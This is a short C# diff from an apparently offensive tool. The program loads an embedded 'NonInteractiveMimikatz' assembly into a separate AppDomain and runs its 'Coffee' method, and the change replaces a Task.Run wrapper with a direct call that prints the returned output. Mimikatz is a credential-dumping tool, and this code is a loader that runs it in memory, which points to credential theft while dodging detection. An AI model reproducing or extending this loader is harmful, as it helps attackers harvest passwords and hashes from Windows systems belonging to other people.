@@ -52,13 +52,16 @@ namespace NewApproach
 
             loader.LoadAssembly(Properties.Resources.NonInteractiveMimikatz);
             Console.WriteLine("Assembly was loaded into new \"Test\" AppDomain");
+             
+            //var t = Task.Run(() => {
+                object result = loader.ExecuteStaticMethod("NonInteractiveKatz.NonInteractiveKatz", "Coffee");
+                string s = result as string;
+                Console.WriteLine(s);
+            //});
 
-            var t = Task.Run(() => {
-                loader.ExecuteStaticMethod("NonInteractiveKatz.NonInteractiveKatz", "Coffee");
-            });
-
-            t.Wait();
-            t.Dispose();
+            //t.Wait();
+            //t.Dispose();
+            
             Console.WriteLine("Execution was finished");
             AppDomain.Unload(ad);
             ad = null;
